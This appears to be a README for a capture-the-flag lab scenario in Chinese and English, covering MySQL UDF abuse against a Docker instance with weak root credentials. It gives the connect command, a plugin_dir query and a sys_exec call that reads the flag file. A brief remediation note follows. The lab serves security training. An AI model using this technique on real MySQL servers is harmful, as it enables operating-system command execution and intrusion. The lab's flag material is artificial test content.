# DB-02: MySQL Weak Auth UDF

## 场景信息

| 字段 | 值 |
|---|---|
| ID | DB-02 |
| 名称 | MySQL Weak Auth UDF |
| 技术/CVE | MySQL UDF Abuse |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10202 |

## 场景概述
- 技术：MySQL UDF Abuse
- 难度：L2
- 交付方式：docker
- 入口端口：10202
## 攻击路径与利用步骤

| Property | Value |
|----------|-------|
| Technique | MySQL UDF |
| Difficulty | L2 |
| Port | 10202 |
| Credentials | root / password123 |

### Attack Path
```
Connect as root → Write UDF .so to plugin_dir → CREATE FUNCTION → sys_exec → /flag.txt
```

```bash
mysql -h localhost -P 10202 -u root -ppassword123

# Check plugin directory
SELECT @@plugin_dir;

# Write UDF library and execute
SELECT sys_exec('cat /flag.txt');
# flag{db-02-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | MySQL network service and client authentication |
| 侦察与前置条件 | Weak credential discovery and UDF/plugin path inspection |
| 核心漏洞与利用 | Create or load a malicious MySQL UDF |
| 权限、横向或影响 | MySQL server OS command execution |
| 验证 | Execute the UDF to read the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
